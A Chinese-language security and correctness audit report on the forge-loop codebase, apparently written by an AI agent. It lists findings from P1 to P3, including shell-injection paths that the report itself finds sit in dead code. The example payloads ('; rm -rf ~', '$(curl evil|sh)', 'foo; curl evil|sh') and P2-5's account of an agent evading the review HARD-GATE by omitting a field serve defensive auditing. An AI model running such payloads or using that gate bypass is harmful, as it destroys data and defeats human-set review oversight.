# Forge 全量审核报告

- **项目**: forge-loop v3.9.0
- **审核日期**: 2026-07-16
- **审核 commit**: `7da04582` (main)
- **审核方式**: 主通道人工深审(subagent workflow 连续 4 次被 429 限流阻断,降级为主 agent 逐模块读审)
- **审核者**: Claude (Fable 5)
- **交叉核验**: 已完成(主通道逐条追溯调用链,见文末「交叉核验结果」)。P1-1 经核验降级为 P3-latent(死代码,当前无生产可达路径)。
- **全量覆盖**: 已完成(原「未覆盖区」清零,见文末「全量覆盖补审」)。净真实阻断项:P1-2 一条。

---

## 执行摘要

覆盖 `src/` 约 340 个文件中的核心与高风险模块(锁机制、MCP 执行面、ship 门禁、错误恢复、状态/路由、review 回帖、子进程调用面、保护 hook、外围渲染)。共 **11 项发现**:P1 × 2、P2 × 6、P3 × 3,无 P0。

**最重要的两点**:
1. **P1 命令注入** — `harness-tmux.ts` 把 `targetCommand` 拼进 `bash -c`,从 `cli-harness` 可达。
2. **P1 tier 命名分裂** — `"light"` vs `"lightweight"`,导致 light 档 `/forge resume` 恢复链崩溃。

**系统性风险**:多个 P2 同根因 —— 异常/缺失输入被静默降级为"安全空值"后继续执行(fail-open),而项目自身规则(state-file-locking Knuth Invariant、review HARD-GATE)要求 fail-closed。

---

## P0-P1 阻塞项

### P1-1 — `src/harness-tmux.ts:53` 命令注入(bash -c 字符串拼接)

```ts
"bash", "-c", `${opts.targetCommand}; echo EXIT_CODE:$?`
```

`targetCommand` 经 `src/cli-harness.ts:61/81/100` 从调用方透传,未做 shell 转义即拼进 `bash -c`。

- **失败场景**:`targetCommand` 含 `; rm -rf ~` 或 `$(curl evil|sh)` → tmux 会话内执行任意命令。对比:MCP 侧 `forge-exec.ts` 有 allowlist + metachar 拦截,此路径完全绕过那套防护。
- **可达性**:已确认从 cli-harness 透传;若 `targetCommand` 任何部分源自 spec/config/外部输入即可利用。
- **修复**:改 `execFile` 数组传参,或对 `targetCommand` 走与 forge-exec 相同的 `containsShellMetachars` 校验;`EXIT_CODE` 捕获改用退出码而非拼接 echo。

### P1-2 — tier 命名分裂 `"light"` vs `"lightweight"`

- 主流类型/运行时值:`"light"`(`router.ts:38`、`doctor.ts:575`、`workflow-graph.ts:1`、`.forge/status.md:3`、templates)
- error-recovery/resume 侧:`resume.ts:289` 与 `PHASE_SEQUENCES`(`error-recovery/types.ts:264`)key 为 `"lightweight"`
- `serde.ts:89` 用 `as ForgeTier` 强转,无 runtime 校验

- **失败场景**:light 档会话中断 → `/forge resume` 从 status.md 读到 `"light"` → `PHASE_SEQUENCES["light"]` 为 `undefined` → `findPhaseInconsistencies` 内 `seq.indexOf(...)` 抛 `TypeError: Cannot read properties of undefined` → 整条恢复链崩溃,恰在用户最需恢复时。
- **修复**:全项目统一为 `"light"`;error-recovery 侧 key 重命名;`serde` 解析加 tier 白名单校验,未知值拒绝而非强转。

---

## P2

### P2-1 — `src/status-atomic.ts:104-110` 吞读错误导致 clobber

```ts
try { prev = io.exists(targetPath) ? io.read(targetPath) : ""; }
catch { prev = ""; }        // read 失败被吞成空串
const next = transform(prev);
io.move(tmpPath, targetPath);   // 原子覆盖 → 原内容全灭
```

- **失败场景**:`status.md` 存在(`io.exists`=true)但 `io.read` 抛错(权限瞬变/IO 错误/EMFILE)→ `prev=""` → `transform`(更新单字段的纯函数)基于空串产出残缺文件 → `move` 覆盖 → 原有全部 status 内容丢失。直接违反 `state-file-locking.md` 的 Knuth Invariant("never overwrite / only append")。
- **修复**:区分 not-exists(合法空)与 exists-but-read-fails(真错误);后者抛错中止写(fail-closed),与锁超时同哲学。

### P2-2 — `src/ship-gates.ts:314-321` P1 门禁可被自称 allFixed 的 fixlist 绕过

无 `gitLogFn` 注入时,`p1-fixlist.json` 自身 `allFixed:true` 即放行,不做 git commit 验证。`runAllGates` 的 `gitLogFn` 为可选参数,生产入口为 skill 指令层(LLM 驱动),无强制注入保证。

- **失败场景**:review 报 P1>0,存在 `allFixed:true` 的 fixlist(手改/残留),skill 调 `runAllGates` 未传 `gitLogFn` → P1 gate pass → 未修 P1 代码被 ship。绕过 CLAUDE.md §3.3 "P0/P1 阻断 ship" 铁律。
- **修复**:`gitLogFn` 缺失时对自称 allFixed 的 fixlist 不予采信;强制必传,或无验证手段时 P1>0 一律 block。

### P2-3 — `src/error-recovery/reconciler.ts:134-166` 正常 build 中断被误报 phase-ahead

`findPhaseInconsistencies`:tasks 未全完成 + `phaseIdx>0` → 一律报 `"ahead"`,期望阶段=前一阶段。但 build 进行中 tasks 未完成是**最常见**的中断恢复场景。

- **失败场景**:standard 档、phase=`build`、任务做一半中断 → resume 报 "Tasks incomplete but phase is build, expected still at plan",且 `engine.ts:159` 将其计入 `autoFixable`,默认动作 "Apply phase revert" → 把正常 build 阶段回退到 plan,并污染 `classifyInterruption` 输入。
- **修复**:"ahead" 判定应检查 currentPhase 是否**超过执行阶段(build)**,而非只要 `phaseIdx>0`。

### P2-4 — `src/review-comment-bitbucket/post.ts:144-189` 拉取现状失败→重复灌评论

`list_pr_tasks` / `get_pull_request` 用 `Promise.allSettled`,失败降级为空数组(`:168-169`)继续 reconcile → 看不到已有任务/评论 → `plan.creates` 含全部 findings → 全部重新 post。

- **失败场景**:Bitbucket API 瞬时抖动(超时/5xx)恰在 fetch 阶段 → 同批 P0-P2 findings 在 PR 上重复建任务 + 重复评论;每重跑一次翻倍一次。容错设计反而制造垃圾。
- **修复**:reconcile 依赖的现状拉取失败应中止 post(fail-closed),而非当作空。

### P2-5 — `src/schemas/review-report.ts:42` methodology 缺省 fail-open,HARD-GATE 可绕

`METHODOLOGY_DEFAULT = "subagent-parallel"` —— frontmatter 不写 methodology 时自动补合法值;而 `checkFallbackLadderGate`(`ship-gates.ts:735`)只拦 `"unavailable"`。

- **失败场景**:主 agent 违宪自写 review 报告(正是 HARD-GATE 要防的),只要省略 methodology 字段 → 默认补 `subagent-parallel` → ladder gate 放行 → ship。L3 "主 agent 不得顶替评审" 铁律被缺省值架空。
- **修复**:methodology 缺失应判 gate fail 或要求显式值,不能默认为最可信档位。

### P2-6 — `src/status-manager.ts:134-140` 状态写失败仅 stderr 不阻断

`writeTaskStatus` 顶层 catch 把所有写失败(含 `writeStatusAtomic` 的锁超时 `ToolHealthLockTimeoutError`)降级为 stderr 警告后继续。

- **失败场景**:锁竞争超时 → 状态未落盘,但调用方无从得知,继续推进阶段 → 后续 resume/gate 读到过期状态,决策基于陈旧数据。已比"静默吞"改进(有 stderr),但对 P1 级状态一致性仍偏松。
- **修复**:区分可恢复(文件缺失)与不可恢复(锁超时/IO)错误;后者应上抛给调用方决策。

---

## P3

### P3-1 — `src/loop/stopwhen.ts:80-83` 非法停止条件静默失效

`parseStopCondition` 返回 null(如手误 `max-iteration:5` 少 s)→ `evaluateStopWhen` 返回 `shouldStop:false`、reason 空 → 停止条件永不触发,无告警。有 three-strike 兜底不会真死循环,但用户停止意图静默丢失。**修复**:parse 失败返回 error/warning。

### P3-2 — Fallback ladder 编号在代码与文档间漂移

代码 `review/fallback.ts`:L0=subagent-parallel → L1=serial → L2=ci-evidence → L3=unavailable。规则文档 `workflow-fallback-ladder.md`:L0=saved-workflow → L1=parallel → L2=serial → L3。`ci-evidence` 在文档表中不存在。同套 L0-L3 术语两处含义不同,人和 LLM 均易混。**修复**:统一编号语义或在两处交叉标注映射。

### P3-3 — `src/review-comment-bitbucket/post.ts` 两处小瑕疵

- `:482` 未知任务状态默认按 `"RESOLVED"` → 实际 OPEN 任务可能被误判 regressed 触发多余 reopen。
- `:73-87` skip 记录写 `"platform-disabled-by-config"`,返回值却是 `"disabled-by-cli"`,观测数据自相矛盾。

---

## 系统性风险

### SR-1 — Fail-open 与项目 fail-closed 纪律冲突(跨模块)

P2-1(status-atomic)、P2-4(bitbucket post)、P2-5(review-report methodology)、P2-6(status-manager)四处同根因:**异常或缺失输入被静默降级为"安全空值/默认值"后继续执行**。但项目自身规则明确要求关键路径 fail-closed:

- `state-file-locking.md` Knuth Invariant:禁止用模板默认覆盖已有内容
- workflow-fallback-ladder HARD-GATE:L3 阻断 ship,主 agent 不得顶替

**建议**:写一条 evolved rule 进 `.forge/knowledge/evolved-rules.md` —— "状态一致性 / 门禁 / 外部副作用路径,异常输入必须 fail-closed(抛错中止),禁止静默降级为空值继续"。并区分两类 catch:降级到**更严**(zone-registry 回退默认规则、nonce 重新生成)是正确的;降级到**丢数据/放行**是缺陷。

### SR-2 — 双执行面防护不对称

MCP 侧 `forge-exec.ts` 有完整防护(allowlist + module-load flag 白名单 + metachar 纵深),但 CLI 侧 `harness-tmux.ts`(P1-1)完全绕过。防护集中在一条路径,另一条裸奔。**建议**:抽取统一的命令安全校验层,所有子进程入口(tmux/mutate/ship/accept-driver)共用。

---

## 未覆盖区域与深挖建议

**已深审**:status-atomic、tool-health-writer、forge-exec、forge-git、path-validator、accept-credentials、accept-security、ship-gates、context-budget(部分)、error-recovery(engine/reconciler)、loop(stopwhen/three-strike)、state.ts、status-manager、router(部分)、review/fallback、state-machine/validator、decide/orchestration(粗)、review-comment-bitbucket/post、frozen-zone-hook、destructive-nonce、zone-registry、forge-dispatcher(audit-log/allowlist/untrusted-fence)、living-doc/renderer、子进程调用点全局扫描、empty-catch 全局盘点。

**未覆盖(建议后续深挖)**:
- `docs-governance/`(2601 行,仅确认无 fs 写)—— 逻辑正确性未审
- `mcp/tools/typed-capabilities.ts`(471 行)、`mcp/trimmers/`
- `pua-engine.ts`(811,仅确认纯函数无副作用)、`learn.ts`(831)业务逻辑
- `accept-driver.ts`(810)、`mutate.ts`(590)完整流程
- `task-graph.ts` / `workflow-graph.ts` 仅粗扫环检测,拓扑排序边界未细审
- `glossary/`、`grill/`、`pack/`、`domain/`、`checkpoint/` 全部
- 约 250+ 文件未逐行

**方法论建议**:待 subagent 429 限流解除后,用 `.claude/projects/.../workflows/scripts/forge-full-audit-serial.js`(resume `wf_4cd5f363-573`)跑全量 + 对抗验证,交叉核验本报告发现并补齐未覆盖区。本报告所有发现均**未经独立对抗验证**(验证 agent 同被限流),P1/P2 建议修前各自复核一次失败场景可达性。

---

## 修复优先级建议

1. **P1-1 tmux 注入** — 安全阻断级,优先
2. **P1-2 tier 分裂** — 功能崩溃级,改动小(重命名 + 校验)
3. **P2 fail-open 四连(SR-1)** — 同根因,建议一批修 + 落 evolved rule
4. **P2-2 ship gate 绕过** — 门禁完整性
5. P2-3 phase-ahead 误报、P3 三项 — 可排期

---

## 交叉核验结果(2026-07-16,主通道逐条追溯)

subagent workflow 仍被 429 阻断,交叉核验改由主通道逐条追溯调用链完成。方法:对每条发现独立读实际代码 + 上下游调用者,验证失败场景是否真实可达。

| ID | 原级别 | 核验判定 | 依据 |
|----|--------|----------|------|
| **P1-1** tmux 注入 | P1 | **降级 → P3-latent** | `runTmuxHarness` 仅被 `cli-harness.ts` 调;`runCliHarness` 全仓无调用者、未在 `index.ts` 导出。**未接线死代码,当前无生产可达路径**。注入模式真实存在但不可利用 —— 修复仍建议做(防未来接线),但非当前阻断项。 |
| **P1-2** tier 分裂 | P1 | **CONFIRMED(维持 P1)** | `recovery-priority-chain.md` 步骤 1 明写"从 status.md frontmatter 读 tier 传入 `runRecoveryChain`";`.forge/status.md:3` 实际值 `"light"`;`PHASE_SEQUENCES` 仅 `lightweight` key。崩溃点精确:`reconciler.ts:139-140` `PHASE_SEQUENCES["light"]`=undefined → `undefined.indexOf()` 抛 TypeError,`phaseIdx<0` guard 在崩溃之后。真实可达。 |
| **P2-1** status-atomic clobber | P2 | **CONFIRMED** | `StatusManagerIO`(`status-manager.ts:36-41`)`exists` 与 `read` 分离;`read` 抛错被 `status-atomic.ts:107` catch 吞成空 prev。 |
| **P2-2** ship gate 绕过 | P2 | **CONFIRMED** | `gitLogFn` 可选;`runAllGates` 生产入口为 skill 层(LLM),无强制注入。 |
| **P2-3** phase-ahead 误报 | P2 | **CONFIRMED** | `engine.ts:62-69` phase revert `isDefault:true` 自动默认;build 进行中 tasks 未完成为常态。 |
| **P2-4** 重复灌评论 | P2 | **CONFIRMED**(未再追溯,维持) | 代码逻辑清晰:`post.ts:168-169` allSettled 失败降级空数组。 |
| **P2-5** methodology fail-open | P2 | **CONFIRMED**(未再追溯,维持) | `METHODOLOGY_DEFAULT` + gate 只拦 unavailable,逻辑确定。 |
| **P2-6** 状态写失败不阻断 | P2 | **CONFIRMED**(未再追溯,维持) | `status-manager.ts:134` 顶层 catch 逻辑确定。 |
| **P3-1/2/3** | P3 | **维持** | 代码逻辑直读可确认,未见反驳证据。 |

### 补审未覆盖区(本轮新增)

| 模块 | 结论 |
|------|------|
| `task-graph.ts` 环检测 | **干净**。`validateGraph` 先查悬空依赖(Check 2)且 `errors.length===0` 才跑 `detectCycle`,顺序正确 —— 悬空依赖不会被 Kahn 误报成 cycle。曾疑此点,追溯后排除。 |
| `mutate.ts` stryker 调用 | **干净**。`execFileSync("npx", [...])` 数组传参,无 shell 拼接。 |
| `accept-driver.ts` agent-browser | **干净**。`which` + sha256 pin 校验,数组传参;凭证经 stdin 非 argv(符合 spec R4-AC2)。 |

### 核验结论

- **11 条中 10 条维持**,1 条(P1-1)降级为 latent。
- **净剩阻断项:P1-2 一条**(功能崩溃级,改动小 —— 统一 tier 命名 + serde 校验)。
- 补审 task-graph/mutate/accept-driver 三模块均干净,无新增发现。
- **仍未覆盖**:docs-governance 完整逻辑、pua-engine/learn 业务逻辑、glossary/pack/domain/checkpoint/grill、约 250+ 文件。这些区域本轮**未做**代码级核验,待 subagent 限流解除后用 workflow 全量补齐。
- 本次交叉核验为主通道单人追溯,非独立多 agent 对抗验证 —— 置信度高于初审但低于 workflow 对抗流程。P1-2 修前建议再复核一次 status.md tier 实际写入值。

---

## 全量覆盖补审(2026-07-16 第二轮,原「未覆盖区」清零)

subagent 仍限流,主通道逐模块过完剩余全部区域。

### 新发现

#### P3-latent-A — `src/harness-pty.ts:33` 命令注入(与 P1-1 同族,死代码)

```ts
spawn("bash", ["-c", opts.targetCommand], {...})
```

`targetCommand` 拼进 `bash -c`。溯源:`runPtyHarness` 仅被 `cli-harness.ts:99` 调,与 P1-1 同属未接线死代码链(`runCliHarness` 无生产调用者、未导出)。**当前不可达**。

#### P3-latent-B — `src/accept-driver.ts:520` 命令注入(死代码)

```ts
const command = resolveTestCommand(layer, cfg, evidencePath ?? undefined);
execDescriptor({ executable: "sh", args: ["-c", command] }, ...)
```

`command` 含两处拼接输入:`cfg.testCommands[layer]`(来自 `.forge/config.md`)+ `evidencePath`(`resolveTestCommand:474/478` 直接字符串拼末尾;`evidencePath` 由 `extractEvidencePath` 从 `scenario.rawText` 的 `Evidence:` 行正则提取,半可信)。

- **失败场景(若接线)**:acceptance scenario 的 `Evidence:` 行含 `foo; curl evil|sh` → 拼进 `sh -c` 执行。
- **可达性**:`makeDelegateRunner` 在 src 内无生产调用者(仅 `contract-fresh.ts` 注释提及);`runAcceptanceGate`(ship.ts:599)是桩实现(`summary.pass = scenarios.length`,不真跑命令)且自身也未接线/未导出。**当前不可达**。

### 判定干净的模块

| 模块 | 结论 |
|------|------|
| `docs-governance/`(1182 行实际) | **干净**。纯 non-blocking 校验器(双语/配额/时效/链接/root-whitelist)。`staleness.ts` 时间逻辑严谨:UTC 归一化、future-date 判 invalid、drift 检测正确。 |
| `pua-engine.ts`(811) | **干净**。纯启发式函数(关键词匹配失败模式、压力分级),无副作用无 I/O。误判仅影响提示文案。 |
| `learn.ts` + `learn/`(831+) | **干净**。纯计算(feedback 分析/validation/evolution 渲染),唯一 fs 写有 catch;confidence [0.3,0.9] 校验、20-doc 清理符合宪法 §4.2。 |
| `glossary/` `pack/` `domain/` `checkpoint/` `grill/` | **干净**。无破坏性 fs 写、无 shell、无 `as any`。`pack/loader.ts` 有 `isWithinBase` 路径遍历防护(:138);`domain/reservations/` 为 DDD 示例代码非 forge 核心。 |
| `mcp/tools/typed-capabilities.ts`(471) | **干净**。`runCheckProfile` 的 `command` 从 4 个硬编码 npm 命令枚举选出,`profile` 受 zod enum 约束,无用户可控字符串进 `execCommand`。 |
| `mcp/` 其余(server/project-root/trimmers) | **干净**。所有 execCommand 调用均为硬编码常量。 |
| `mutate.ts` / `accept-driver.ts`(agent-browser pin) | **干净**(见前轮)。 |

### 全量覆盖结论

- **所有子进程注入点(tmux/pty/accept-driver)追溯后统一结论**:注入模式真实存在,但全部位于**未接线的死代码链**。真正接生产的执行面(`forge-exec`/`forge-git`/mcp typed-capabilities)防护严密(allowlist + module-load 白名单 + metachar 纵深 + 硬编码命令)。
- **净发现汇总(全项目)**:P1 × 1(P1-2 tier 分裂,唯一真实阻断项)、P2 × 6、P3 × 3、P3-latent × 3(死代码注入,含 P1-1 降级)。**无 P0,无新增真实可达的 P1/P2**。
- **覆盖率**:核心 + 高风险 + 全部原「未覆盖」区已过。剩余未逐行的仅纯类型定义(`types.ts`)、模板、示例代码(`domain/reservations`)—— 无逻辑风险面。

### 系统性建议(补充 SR-2)

**SR-2 强化** — 3 处死代码注入点(harness-tmux/harness-pty/accept-driver)共享一个隐患:一旦未来把 `runCliHarness`/`makeDelegateRunner` 接线到生产,3 个注入面同时激活。建议**在死代码删除或接线前**统一改数组传参 / 复用 `containsShellMetachars`,避免"接线即中招"。这是 SR-2(执行面防护不对称)的延伸:防护缺口集中在这批未接线 harness。
